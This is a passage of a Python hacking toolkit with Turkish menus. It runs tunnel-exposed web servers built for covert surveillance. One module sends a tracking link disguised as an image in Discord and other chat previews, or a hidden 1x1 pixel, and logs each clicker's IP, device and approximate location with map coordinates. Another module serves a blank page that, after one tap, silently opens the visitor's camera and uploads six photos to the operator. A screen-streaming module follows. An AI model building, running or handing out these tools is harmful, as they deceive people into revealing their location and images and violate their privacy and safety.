                        f"<img src='{og}/img' alt='' draggable='false' "
                        "oncontextmenu='return false'>"
                        "</body></html>"
                    ).encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type","text/html; charset=utf-8")
                    self.send_header("Cache-Control","no-cache")
                    self.end_headers()
                    self.wfile.write(html2)
            elif s == "3":
                # Mod 3 — direkt resim ver
                import mimetypes as _mts3
                mime3 = _mts3.guess_type(resim_yolu)[0] or "image/jpeg"
                try:
                    with open(resim_yolu,"rb") as f:
                        data = f.read()
                    self.send_response(200)
                    self.send_header("Content-Type", mime3)
                    self.send_header("Content-Length", str(len(data)))
                    self.end_headers()
                    self.wfile.write(data)
                except:
                    self.send_response(404); self.end_headers()
            elif s == "4":
                import mimetypes as _mts4
                mime4 = _mts4.guess_type(resim_yolu)[0] or "image/jpeg"
                if path == "/img":
                    # Resmi direkt ver
                    try:
                        with open(resim_yolu,"rb") as f:
                            data4 = f.read()
                        self.send_response(200)
                        self.send_header("Content-Type", mime4)
                        self.send_header("Content-Length", str(len(data4)))
                        self.send_header("Cache-Control","no-cache")
                        self.end_headers()
                        self.wfile.write(data4)
                    except:
                        self.send_response(404); self.end_headers()
                else:
                    # Ana sayfa — Open Graph + tam ekran resim
                    og = pub_url_holder[0] if pub_url_holder else ""
                    resim_boyut = os.path.getsize(resim_yolu)
                    html4 = (
                        "<!DOCTYPE html><html><head>"
                        "<meta charset='UTF-8'>"
                        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
                        # Open Graph — Telegram/Discord/WhatsApp önizlemesi
                        "<meta property='og:type' content='website'>"
                        "<meta property='og:title' content=' '>"
                        "<meta property='og:description' content=' '>"
                        f"<meta property='og:image' content='{og}/img'>"
                        f"<meta property='og:image:type' content='{mime4}'>"
                        f"<meta property='og:image:width' content='1200'>"
                        f"<meta property='og:image:height' content='630'>"
                        f"<meta property='og:url' content='{og}'>"
                        # Twitter/X kart
                        "<meta name='twitter:card' content='summary_large_image'>"
                        f"<meta name='twitter:image' content='{og}/img'>"
                        # Sayfa stili — sadece resim
                        "<style>"
                        "*{margin:0;padding:0;box-sizing:border-box}"
                        "body{background:#000;display:flex;align-items:center;"
                        "justify-content:center;min-height:100vh}"
                        "img{max-width:100%;max-height:100vh;object-fit:contain}"
                        "</style>"
                        "</head><body>"
                        f"<img src='{og}/img' alt=''>"
                        "</body></html>"
                    ).encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type","text/html; charset=utf-8")
                    self.send_header("Cache-Control","no-cache")
                    self.end_headers()
                    self.wfile.write(html4)
            else:
                # Mod 1 — HTML sayfa + yönlendirme
                self.send_response(200)
                self.send_header("Content-Type","text/html; charset=utf-8")
                self.send_header("Cache-Control","no-cache")
                self.end_headers()
                self.wfile.write(HTML_LINK)

        def log_message(self, *args): pass

    def yazdir_tiklayanın(z, idx):
        from datetime import datetime
        print(f"\n  {BOLD}{YELLOW}{'═'*52}{R}")
        print(f"  {BOLD}{YELLOW}  [!] TIKLAYANIN #{idx} TESPİT EDİLDİ  [{z['saat']}]{R}")
        print(f"  {YELLOW}{'═'*52}{R}")
        # UA parse
        cihaz, os_, br_ = ua_parse(z["ua"])
        lv("  Cihaz",    cihaz,  lc=DGREEN, vc=WHITE)
        lv("  OS",       os_,    lc=DGREEN, vc=WHITE)
        lv("  Tarayici", br_,    lc=DGREEN, vc=WHITE)
        lv("  IP",       z["ip"],lc=DGREEN, vc=RED)
        # Konum
        try:
            ip_s = z["ip"]
            if ":" in ip_s:
                try: ip_s = requests.get("https://api4.ipify.org",timeout=2).text.strip()
                except: pass
            rl = requests.get(
                f"http://ip-api.com/json/{ip_s}?fields=status,city,district,regionName,country,isp,lat,lon",
                timeout=3).json()
            if rl.get("status") == "success":
                ilce  = rl.get("district","")
                sehir = rl.get("city","?")
                bolge = rl.get("regionName","?")
                ulke  = rl.get("country","?")
                konum = (f"{ilce}, {sehir}" if ilce and ilce!=sehir else sehir) + f" / {ulke}"
                isp   = rl.get("isp","?")
                lat   = rl.get("lat","?")
                lon   = rl.get("lon","?")
                lv("  Konum",   konum, lc=DGREEN, vc=RED)
                lv("  ISP",     isp,   lc=DGREEN, vc=GRAY)
                if lat != "?":
                    lv("  Koordinat", f"{lat}, {lon}", lc=DGREEN, vc=GRAY)
                    maps = f"https://maps.google.com/?q={lat},{lon}"
                    lv("  Maps",  maps,  lc=DGREEN, vc=DGREEN)
        except: pass
        print(f"  {YELLOW}{'═'*52}{R}\n")

    # ── Sunucu başlat ────────────────────────────
    sunucu = HTTPServer(("0.0.0.0", PORT_T), TakipHandler)
    th = _th5.Thread(target=sunucu.serve_forever, daemon=True)
    th.start()

    # Cloudflared tünel
    CF_EXE = os.path.join(os.path.expanduser("~"), ".soldaten", "cloudflared.exe")
    if not os.path.isfile(CF_EXE):
        spin("Cloudflared indiriliyor...", 3)
        CF_URL = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        try:
            import urllib.request
            os.makedirs(os.path.dirname(CF_EXE), exist_ok=True)
            urllib.request.urlretrieve(CF_URL, CF_EXE)
        except Exception as e:
            error(f"Cloudflared indirilemedi: {e}"); sunucu.shutdown(); pause(); return

    spin("Cloudflare tuneli aciliyor...", 2)
    cf_p = subprocess.Popen(
        [CF_EXE, "tunnel", "--url", f"http://localhost:{PORT_T}", "--no-autoupdate"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

    public_url = None
    deadline = time.time() + 20
    while time.time() < deadline:
        line = cf_p.stderr.readline().decode("utf-8", errors="replace")
        m = _re5.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line)
        if m: public_url = m.group(0); break

    if not public_url:
        cf_p.terminate(); sunucu.shutdown()
        error("Cloudflare URL alinamadi."); pause(); return

    # URL'yi holder'a yaz
    pub_url_holder[0] = public_url

    # Discord icin .jpg ile biten URL resim embed eder
    discord_url = public_url + "/foto.jpg" if s in ("2","4") else public_url

    mod_adi = {"1":"Tiklama","2":"Resim Link","3":"PNG+Link","4":"Discord Resim"}.get(s,"?")
    clear()
    banner("TAKIP LINKI", f"Mod: {mod_adi}")
    if s in ("2","4"):
        print(f"\n  {BOLD}{GREEN}  Asagidaki URL'yi Discord DM'e yapistir:{R}")
        print(f"  {BOLD}{WHITE}  {discord_url}{R}")
        print()
        print(f"  {DGREEN}  Discord'da resim olarak gorunur.{R}")
        if s == "2":
            print(f"  {DGREEN}  'Tarayicida Ac' tiklaninca bilgi duser.{R}")
        elif s == "4":
            print(f"  {DGREEN}  'Tarayicida Ac' tiklaninca bilgi duser.{R}")
            print(f"  {YELLOW}  NOT: Resme direkt tiklayinca Discord kendi onizlemesini acar.{R}")
            print(f"  {YELLOW}       'Tarayicida Ac' butonu gorununce tiklayinca bilgi duser.{R}")
    elif s == "3":
        lv("  Takip URL", public_url, lc=DGREEN, vc=GREEN)
        masaustu_png = os.path.join(os.path.expanduser("~"),"Desktop","foto_paylasim.png")
        lv("  PNG Dosya", masaustu_png, lc=DGREEN, vc=WHITE)
        print(f"\n  {DGREEN}  PNG resmi karsiya gonder.{R}")
        print(f"  {DGREEN}  Takip URL'yi de atarsan tiklayanin bilgisi duser.{R}")
    else:
        lv("  URL", public_url, lc=DGREEN, vc=GREEN)
    print()

    # QR göster
    qr = qrlib.QRCode(border=2)
    qr.add_data(public_url)
    qr.make(fit=True)
    try:
        "██".encode(sys.stdout.encoding or "utf-8")
        dolu, bos = "██", "  "
    except:
        dolu, bos = "##", "  "
    for row in qr.get_matrix():
        print("  " + GREEN + "".join(dolu if c else bos for c in row) + R)

    if s == "2":
        print(f"\n  {DGREEN}Pixel HTML'e gomme kodu:{R}")
        print(f'  {GRAY}<img src="{public_url}" width="1" height="1">{R}')
    elif s == "3":
        print(f"\n  {DGREEN}Resim HTML linki:{R}")
        print(f'  {GRAY}<a href="{public_url}"><img src="{public_url}"></a>{R}')

    print(f"\n  {GREEN}Bekleniyor — tıklayanlar asagida gosterilir.{R}")
    print(f"  {DGREEN}Cikmak icin CTRL+C{R}\n"); thick()

    try:
        sayac = 0
        while True:
            time.sleep(0.5)
            with tik_lock:
                if tıklar:
                    batch = tıklar[:]
                    tıklar.clear()
                else:
                    batch = []
            for z in batch:
                sayac += 1
                yazdir_tiklayanın(z, sayac)
    except KeyboardInterrupt:
        cf_p.terminate(); sunucu.shutdown()
        clear(); success("Takip linki kapatildi."); pause()


# ════════════════════════════════════════════════
#  29. EKRAN GORUNTUSU AL
# ════════════════════════════════════════════════
def menu_uzak_ekran():
    banner("EKRAN GORUNTUSU AL", "QR tara — kamera ile goruntu al, masaustune kaydet")

    print(f"  {GREEN}[1]{R}  {BOLD}{GREEN}QR ile Goruntu Al (Cloudflare){R}  {DGREEN}Herkes tara, goruntuleri al{R}")
    print(f"  {GREEN}[2]{R}  {BOLD}{GREEN}Telefon Kamera (Yerel Ag){R}       {DGREEN}Ayni WiFi, hizli{R}")
    print(f"  {RED}[0]{R}  {RED}Geri{R}")
    print(f"\n  {GREEN}Secim:{R}  ", end=""); s = input().strip()

    if s == "0":
        return

    DESKTOP  = os.path.join(os.path.expanduser("~"), "Desktop")
    SAVE_DIR = os.path.join(DESKTOP, "Ekran_Goruntuleri")
    os.makedirs(SAVE_DIR, exist_ok=True)
    MAX_SNAP = 6

    # ── Ortak: qrcode import ─────────────────────
    try:
        import qrcode as _qr
    except ImportError:
        spin("qrcode yukleniyor", 2)
        subprocess.run([sys.executable, "-m", "pip", "install", "qrcode", "--quiet"],
                       stderr=subprocess.DEVNULL)
        import qrcode as _qr

    import threading   as _th_k
    import json        as _js_k
    import base64      as _b6_k
    import socketserver as _ss_k
    from http.server import HTTPServer, BaseHTTPRequestHandler

    # Boş port bul
    PORT_K = 7070
    for _p in range(7070, 7120):
        try:
            import socket as _sk2
            _t = _sk2.socket(_sk2.AF_INET, _sk2.SOCK_STREAM)
            _t.bind(("", _p)); _t.close()
            PORT_K = _p; break
        except OSError:
            continue

    _lock_k = _th_k.Lock()
    _count  = [0]
    _done   = [False]

    TELEFON_HTML = (
        "<!DOCTYPE html><html><head>"
        "<meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1.0,user-scalable=no'>"
        "<title>.</title>"
        "<style>"
        "*{margin:0;padding:0;box-sizing:border-box}"
        "html,body{width:100%;height:100%;background:#000;overflow:hidden}"
        "#ov{position:fixed;inset:0;background:#000;display:flex;flex-direction:column;"
        "align-items:center;justify-content:center;gap:18px;cursor:pointer;"
        "-webkit-tap-highlight-color:transparent}"
        "#ic{font-size:90px;animation:beat 1.4s ease-in-out infinite;pointer-events:none}"
        "@keyframes beat{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}"
        "#st{position:fixed;bottom:16px;left:0;right:0;text-align:center;"
        "color:#3fb950;font-size:13px;font-family:Arial,sans-serif}"
        "video{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;background:#000;display:none}"
        "canvas{display:none}"
        "#fin{position:fixed;inset:0;background:#000;display:none;flex-direction:column;"
        "align-items:center;justify-content:center;gap:14px}"
        "#fin span{font-size:72px}"
        "#fin p{color:#3fb950;font-family:Arial,sans-serif;font-size:15px;text-align:center}"
        "</style></head><body>"
        "<div id='ov' onclick='baslat()'>"
        "<span id='ic'>&#128070;</span>"
        "</div>"
        "<video id='v' autoplay muted playsinline></video>"
        "<canvas id='c'></canvas>"
        "<div id='st'></div>"
        "<div id='fin'><span>&#9989;</span><p id='finMsg'>Goruntular kaydedildi!</p></div>"
        "<script>"
        "var vid=document.getElementById('v');"
        "var cvs=document.getElementById('c');"
        "var ctx=cvs.getContext('2d');"
        "var busy=false,cnt=0,MAX=6;"
        "function msg(m){document.getElementById('st').textContent=m;}"
        "function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}"
        "async function baslat(){"
        "if(busy)return;busy=true;"
        "document.getElementById('ov').style.display='none';"
        "var stream=null;"
        "try{stream=await navigator.mediaDevices.getUserMedia("
        "{video:{facingMode:{ideal:'environment'},width:{ideal:640},height:{ideal:480}},audio:false});}"
        "catch(e){try{stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false});}"
        "catch(e2){document.getElementById('ov').style.display='flex';busy=false;return;}}"
        "vid.srcObject=stream;vid.style.display='block';"
        "await new Promise(function(r){vid.onloadedmetadata=r;});"
        "cvs.width=Math.min(vid.videoWidth||640,640);"
        "cvs.height=Math.min(vid.videoHeight||480,480);"
        "msg('...');await sleep(600);"
        "while(cnt<MAX){"
        "cnt++;"
        "ctx.drawImage(vid,0,0,cvs.width,cvs.height);"
        "var b64=cvs.toDataURL('image/jpeg',0.85).split(',')[1];"
        "var ok=false;"
        "for(var t=0;t<3;t++){"
        "try{"
        "var r=await fetch('/snap',{method:'POST',"
        "headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({jpg:b64,num:cnt})});"
        "var d=await r.json();"
        "if(d.saved){msg(cnt+'/'+MAX);ok=true;break;}"
        "}catch(e){}"
        "await sleep(400);}"
        "if(cnt<MAX)await sleep(1200);}"
        "stream.getTracks().forEach(function(t){t.stop();});"
        "vid.style.display='none';"
        "var f=document.getElementById('fin');f.style.display='flex';"
        "document.getElementById('finMsg').textContent=MAX+' goruntu kaydedildi!';"
        "msg('');}"
        "</script></body></html>"
    ).encode("utf-8")

    class KHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path.split("?")[0] == "/":
                body = TELEFON_HTML
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Cache-Control", "no-cache")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            else:
                self.send_response(204); self.end_headers()

        def do_POST(self):
            if self.path.split("?")[0] != "/snap":
                self.send_response(404); self.end_headers(); return
            resp = b'{"saved":false,"err":"unknown"}'
            try:
                cl  = self.headers.get("Content-Length")
                raw = self.rfile.read(int(cl)) if cl else b""
                if not raw:
                    raise ValueError("bos body")
                d   = _js_k.loads(raw.decode("utf-8"))
                b64 = d.get("jpg", "")
                num = int(d.get("num", 1))
                tip = d.get("tip", "goruntu")
                if not b64:
                    raise ValueError("bos jpg")
                b64 += "=" * (-len(b64) % 4)
                img_bytes = _b6_k.b64decode(b64)
                ts   = int(time.time() * 1000)
                name = f"{tip}_{num:02d}_{ts}.jpg"
                dest = os.path.join(SAVE_DIR, name)
                with open(dest, "wb") as f:
                    f.write(img_bytes)
                with _lock_k:
                    _count[0] += 1
                    if _count[0] >= MAX_SNAP:
                        _done[0] = True
                    c2 = _count[0]
                resp = _js_k.dumps({"saved": True, "name": name, "count": c2}).encode("utf-8")
            except Exception as ex:
                resp = _js_k.dumps({"saved": False, "err": str(ex)}).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-Length", str(len(resp)))
            self.end_headers()
            self.wfile.write(resp)

        def do_OPTIONS(self):
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "Content-Type")
            self.end_headers()

        def log_message(self, *a): pass

    class TSrv(_ss_k.ThreadingMixIn, HTTPServer):
        daemon_threads = True

    sunucu = TSrv(("0.0.0.0", PORT_K), KHandler)
    _th_k.Thread(target=sunucu.serve_forever, daemon=True).start()

    def qr_bas(url):
        qr = _qr.QRCode(border=2)
        qr.add_data(url)
        qr.make(fit=True)
        try:
            "██".encode(sys.stdout.encoding or "utf-8")
            d2, b2 = "██", "  "
        except:
            d2, b2 = "##", "  "
        for row in qr.get_matrix():
            sys.stdout.write("  "+GREEN+"".join(d2 if c else b2 for c in row)+R+"\n")
        sys.stdout.flush()

    def bekle_loop(cf=None):
        prev = 0
        try:
            while True:
                time.sleep(0.4)
                with _lock_k:
                    cnt2 = _count[0]
                    done = _done[0]
                if cnt2 != prev:
                    prev = cnt2
                    sys.stdout.write(f"\r  {GREEN}[+] Goruntu {cnt2}/{MAX_SNAP} kaydedildi{' ':20}{R}\n")
                    sys.stdout.flush()
                if done:
                    thick()
                    success(f"Tamamlandi! {MAX_SNAP} goruntu kaydedildi.")
                    info(f"Konum: {SAVE_DIR}")
                    break
        except KeyboardInterrupt:
            pass
        if cf:
            cf.terminate()
        sunucu.shutdown()
        with _lock_k:
            c3 = _count[0]
        if c3 > 0:
            if confirm("Klasoru ac?"):
                subprocess.Popen(["explorer", SAVE_DIR])
        else:
            warn("Goruntu alinmadi.")
        pause()

    # ── MOD 1: Cloudflare ────────────────────────
    if s == "1":
        CF_EXE = os.path.join(os.path.expanduser("~"), ".soldaten", "cloudflared.exe")
        os.makedirs(os.path.dirname(CF_EXE), exist_ok=True)

        if not os.path.isfile(CF_EXE):
            spin("Cloudflared indiriliyor (tek seferlik ~30MB)", 3)
            try:
                import urllib.request as _ur
                _ur.urlretrieve(
                    "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe",
                    CF_EXE
                )
                info("Cloudflared indirildi.")
            except Exception as e:
                error(f"Cloudflared indirilemedi: {e}")
                sunucu.shutdown(); pause(); return

        spin("Cloudflare tuneli aciliyor...", 2)
        import re as _re_k
        cf_proc = subprocess.Popen(
            [CF_EXE, "tunnel", "--url", f"http://localhost:{PORT_K}", "--no-autoupdate"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        public_url = None
        deadline   = time.time() + 25
        while time.time() < deadline:
            line = cf_proc.stderr.readline().decode("utf-8", errors="replace")
            m    = _re_k.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line)
            if m:
                public_url = m.group(0); break

        if not public_url:
            cf_proc.terminate(); sunucu.shutdown()
            error("Cloudflare URL alinamadi."); pause(); return

        clear()
        banner("GORUNTU AL", f"Cloudflare — Max {MAX_SNAP} goruntu")
        print(f"  {BOLD}{GREEN}QR'i tara, 👆 emojiye dokun → kamera acilir{R}")
        print(f"  {YELLOW}{public_url}{R}")
        print(f"  {DGREEN}Goruntular kaydedilir: {CYAN}{SAVE_DIR}{R}\n")
        qr_bas(public_url)
        print(f"\n  {GRAY}Cikmak icin CTRL+C{R}\n")
        thick()
        bekle_loop(cf=cf_proc)

    # ── MOD 2: Yerel ag ──────────────────────────
    elif s == "2":
        try:
            _sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            _sk.connect(("8.8.8.8", 80))
            local_ip = _sk.getsockname()[0]
            _sk.close()
        except:
            local_ip = "127.0.0.1"
        phone_url = f"http://{local_ip}:{PORT_K}"

        spin("Sunucu baslatiliyor", 0.8)
        clear()
        banner("GORUNTU AL", f"Yerel Ag — Max {MAX_SNAP} goruntu")
        print(f"  {BOLD}{GREEN}Telefonu ayni WiFi'ye bagla, QR'i tara{R}")
        print(f"  {YELLOW}{phone_url}{R}")
        print(f"  {DGREEN}Goruntular kaydedilir: {CYAN}{SAVE_DIR}{R}\n")
        qr_bas(phone_url)
        print(f"\n  {GRAY}Cikmak icin CTRL+C{R}\n")
        thick()
        bekle_loop()

# ════════════════════════════════════════════════

# ════════════════════════════════════════════════
#  30. EKRAN PAYLASIMI (getDisplayMedia)
# ════════════════════════════════════════════════
def menu_canli_izle():
    banner("EKRAN PAYLASIMI", "PC masaustu veya telefon ekranini canli izle")
    print(f"  {DGREEN}Cloudflare HTTPS tuneli sayesinde getDisplayMedia calisir.{R}\n")
    print(f"  {GREEN}[1]{R}  {BOLD}{GREEN}PC Masaustunu Paylas{R}      {DGREEN}Telefondan PC ekranini izle{R}")
    print(f"  {GREEN}[2]{R}  {BOLD}{GREEN}Telefon Ekranini Paylas{R}   {DGREEN}PC'den telefon ekranini izle{R}")
    print(f"  {RED}[0]{R}  {RED}Geri{R}")
    print(f"\n  {GREEN}Secim:{R}  ", end=""); s = input().strip()

    if s == "0": return
    if s not in ("1", "2"):
        warn("Gecersiz secim."); time.sleep(0.8); return

    # mod 1 → PC paylaşır, QR telefona gönderilir (izleyici)
    # mod 2 → Telefon paylaşır, PC'de izleme sayfası açılır
    pc_paylasiyor  = (s == "1")
    tel_paylasiyor = (s == "2")

    try:
        import qrcode as _qr_d
    except ImportError:
        spin("qrcode yukleniyor", 2)
        subprocess.run([sys.executable, "-m", "pip", "install", "qrcode", "--quiet"],
                       stderr=subprocess.DEVNULL)
        import qrcode as _qr_d

    import threading    as _th_d
    import json         as _js_d
    import base64       as _b6_d
    import socketserver as _ss_d
    from http.server import HTTPServer, BaseHTTPRequestHandler

    PORT_D = 7272
    for _p in range(7272, 7320):
        try:
            import socket as _sk_d2
            _t = _sk_d2.socket(_sk_d2.AF_INET, _sk_d2.SOCK_STREAM)
            _t.bind(("", _p)); _t.close()
            PORT_D = _p; break
        except OSError:
            continue

    _lock_d  = _th_d.Lock()
    _frame_d = {"jpg": b"", "ts": 0, "chunks": []}

    # ── PAYLAŞICI HTML (ekranı yakalar, frame gönderir) ──────────
    # Hem PC hem telefon için aynı sayfa, getDisplayMedia kullanır
    # ── PAYLAŞICI HTML — MediaRecorder ile binary chunk gönderir ──
    # canvas.toDataURL() güvenlik kısıtını tamamen aşar
    PAYLASICI_HTML = (
        "<!DOCTYPE html><html><head>"
        "<meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1.0,user-scalable=no'>"
        "<title>.</title>"
        "<style>"
        "*{margin:0;padding:0;box-sizing:border-box}"
        "html,body{width:100%;height:100%;background:#0d1117;overflow:hidden;"
        "display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px}"
        "#ic{font-size:88px;animation:b 1.4s ease-in-out infinite;cursor:pointer}"
        "@keyframes b{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}"
        "#st{color:#3fb950;font-family:Arial,sans-serif;font-size:13px;text-align:center;padding:0 20px}"
        "#vid{position:fixed;inset:0;width:100%;height:100%;object-fit:contain;"
        "background:#000;display:none;z-index:1}"
        "#stop{position:fixed;top:10px;right:10px;z-index:2;background:#da3633;"
        "color:#fff;border:none;border-radius:6px;padding:8px 14px;"
        "font-size:13px;font-weight:bold;cursor:pointer;display:none}"
        "</style></head><body>"
        "<span id='ic' onclick='baslat()'>&#128250;</span>"
        "<div id='st'>Tıkla / Dokun</div>"
        "<video id='vid' autoplay muted playsinline></video>"
        "<button id='stop' onclick='dur()'>&#9632; Durdur</button>"
        "<script>"
        "var rec=null,stream=null,go=false;"
        "function st(m){document.getElementById('st').textContent=m;}"
        "function sl(ms){return new Promise(function(r){setTimeout(r,ms);});}"
        "async function baslat(){"
        "var s=null;"
        "if(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia){"
        "st('Ekran secimi bekleniyor...');"
        "try{s=await navigator.mediaDevices.getDisplayMedia("
        "{video:{frameRate:{ideal:15,max:30},width:{ideal:1920},height:{ideal:1080}},audio:false});}"
        "catch(e){"
        "st('Ekran reddedildi, kamera deneniyor...');"
        "try{s=await navigator.mediaDevices.getUserMedia("
        "{video:{facingMode:{ideal:'environment'},width:{ideal:1280}},audio:false});}"
        "catch(e2){st('Erisim reddedildi.');return;}}}"
        "else{"
        "st('Kamera aciliyor...');"
        "try{s=await navigator.mediaDevices.getUserMedia("
        "{video:{facingMode:{ideal:'environment'},width:{ideal:1280}},audio:false});}"
        "catch(e){st('Izin reddedildi.');return;}}"
        "stream=s;"
        "var vid=document.getElementById('vid');"
        "vid.srcObject=s;vid.style.display='block';"
        "document.getElementById('ic').style.display='none';"
        "document.getElementById('stop').style.display='block';"
        "document.querySelector('#st').style.display='none';"
        "if(s.getVideoTracks()[0]){"
        "s.getVideoTracks()[0].onended=function(){dur();};}"
        "go=true;gonder();}"
        "function dur(){"
        "go=false;"
        "if(stream)stream.getTracks().forEach(function(t){t.stop();});"
        "document.getElementById('vid').style.display='none';"
        "document.getElementById('ic').style.display='block';"
        "document.getElementById('stop').style.display='none';"
        "document.querySelector('#st').style.display='block';"
        "document.getElementById('st').textContent='Tekrar tikla';}"
        "async function gonder(){"
        "var mimeType='video/webm;codecs=vp8';"
        "if(!MediaRecorder.isTypeSupported(mimeType)){"
        "mimeType='video/webm';"
        "if(!MediaRecorder.isTypeSupported(mimeType))mimeType='';}"
        "var opts=mimeType?{mimeType:mimeType,videoBitsPerSecond:1500000}:{};"
        "try{rec=new MediaRecorder(stream,opts);}"
        "catch(e){rec=new MediaRecorder(stream);}"
        "rec.ondataavailable=function(e){"
        "if(e.data&&e.data.size>0&&go){"
        "var fr=new FileReader();"
        "fr.onload=function(){"
        "var b64=fr.result.split(',')[1];"
        "fetch('/chunk',{method:'POST',"
        "headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({d:b64})}).catch(function(){});};  "
        "fr.readAsDataURL(e.data);}  };"
        "rec.start(200);"
        "}"
        "</script></body></html>"
    ).encode("utf-8")

    # ── İZLEYİCİ HTML — MediaSource ile chunk'ları oynatır ───────
    IZLEYICI_HTML = (
        "<!DOCTYPE html><html><head>"
        "<meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1.0'>"
        "<title>Canli Ekran</title>"
        "<style>"
        "*{margin:0;padding:0;box-sizing:border-box}"
        "body{background:#000;display:flex;flex-direction:column;height:100vh;overflow:hidden}"
        "#bar{background:#0d1117;padding:7px 12px;display:flex;align-items:center;"
        "gap:10px;border-bottom:1px solid #21262d;flex-shrink:0}"
        "#bar h2{color:#58a6ff;font-size:.82em;flex:1}"
        "#inf{color:#8b949e;font-size:.7em}"
        ".btn{background:#21262d;color:#c9d1d9;border:none;border-radius:4px;"
        "padding:5px 11px;font-size:.72em;cursor:pointer}"
        ".btn:hover{background:#30363d}"
        "#wrap{flex:1;display:flex;align-items:center;justify-content:center;background:#000}"
        "video{max-width:100%;max-height:100%;object-fit:contain}"
        "#wait{position:fixed;inset:0;display:flex;flex-direction:column;"
        "align-items:center;justify-content:center;gap:12px;background:#000;z-index:5}"
        ".sp{width:36px;height:36px;border:4px solid #21262d;"
        "border-top:4px solid #58a6ff;border-radius:50%;animation:sp .8s linear infinite}"
        "@keyframes sp{to{transform:rotate(360deg)}}"
        "</style></head><body>"
        "<div id='bar'>"
        "<h2>&#128250; Canli Ekran</h2>"
        "<span id='inf'>Bekleniyor...</span>"
        "<button class='btn' onclick='location.reload()'>&#8635;</button>"
        "</div>"
        "<div id='wrap'><video id='v' autoplay muted playsinline></video></div>"
        "<div id='wait'><div class='sp'></div>"
        "<p style='color:#8b949e;font-size:.8em'>Paylasim bekleniyor...</p></div>"
        "<script>"
        "var ms=null,sb=null,queue=[],busy=false,started=false,bytes=0,t0=Date.now();"
        "var MIME='video/webm;codecs=vp8';"
        "if(!MediaSource.isTypeSupported(MIME))MIME='video/webm';"
        "function initMS(){"
        "ms=new MediaSource();"
        "document.getElementById('v').src=URL.createObjectURL(ms);"
        "ms.addEventListener('sourceopen',function(){"
        "try{sb=ms.addSourceBuffer(MIME);}"
        "catch(e){sb=ms.addSourceBuffer('video/webm');}"
        "sb.addEventListener('updateend',function(){"
        "busy=false;flush();});});}"
        "function flush(){"
        "if(busy||!sb||queue.length===0)return;"
        "busy=true;"
        "var chunk=queue.shift();"
        "try{sb.appendBuffer(chunk);}catch(e){busy=false;}}"
        "function addChunk(b64){"
        "var bin=atob(b64);"
        "var arr=new Uint8Array(bin.length);"
        "for(var i=0;i<bin.length;i++)arr[i]=bin.charCodeAt(i);"
        "queue.push(arr.buffer);"
        "if(!started){started=true;document.getElementById('wait').style.display='none';"
        "document.getElementById('v').play().catch(function(){});}"
        "bytes+=arr.length;"
        "var kb=Math.round(bytes/1024);"
        "var sec=((Date.now()-t0)/1000).toFixed(1);"
        "document.getElementById('inf').textContent=kb+'KB / '+sec+'s';"
        "flush();}"
        "async function poll(){"
        "var last=0;"
        "while(true){"
        "try{"
        "var r=await fetch('/chunk?from='+last).then(function(x){return x.json();});"
        "if(r&&r.chunks&&r.chunks.length){"
        "r.chunks.forEach(function(c){addChunk(c);});"
        "last+=r.chunks.length;}"
        "}catch(e){}"
        "await new Promise(function(r){setTimeout(r,100);})}}"
        "initMS();"
        "poll();"
        "</script></body></html>"
    ).encode("utf-8")

    # ── HTTP Handler ─────────────────────────────
    class DHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            path = self.path.split("?")[0]
            qs   = self.path[self.path.find("?")+1:] if "?" in self.path else ""

            if path == "/paylas":
                self._html(PAYLASICI_HTML)
            elif path == "/izle":
                self._html(IZLEYICI_HTML)
            elif path == "/chunk":
                # İzleyici chunk polling — from= parametresiyle yeni chunk'ları döndür
                from_idx = 0
                for part in qs.split("&"):
                    if part.startswith("from="):
                        try: from_idx = int(part[5:])
                        except: pass
                with _lock_d:
                    chunks = _frame_d.get("chunks", [])[from_idx:]
                body = _js_d.dumps({"chunks": chunks}).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.send_header("Cache-Control", "no-store")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            else:
                self.send_response(204); self.end_headers()

        def do_POST(self):
            path = self.path.split("?")[0]
            if path == "/chunk":
                try:
                    cl  = self.headers.get("Content-Length")
                    raw = self.rfile.read(int(cl)) if cl else b""
                    d   = _js_d.loads(raw.decode("utf-8"))
                    b64 = d.get("d", "")
                    if b64:
                        b64 += "=" * (-len(b64) % 4)
                        with _lock_d:
                            if "chunks" not in _frame_d:
                                _frame_d["chunks"] = []
                            _frame_d["chunks"].append(b64)
                            # Max 500 chunk tut (bellek sınırı)
                            if len(_frame_d["chunks"]) > 500:
                                _frame_d["chunks"] = _frame_d["chunks"][-200:]
                            _frame_d["ts"] = int(time.time() * 1000)
                except: pass
                resp = b'{"ok":1}'
                self.send_response(200)
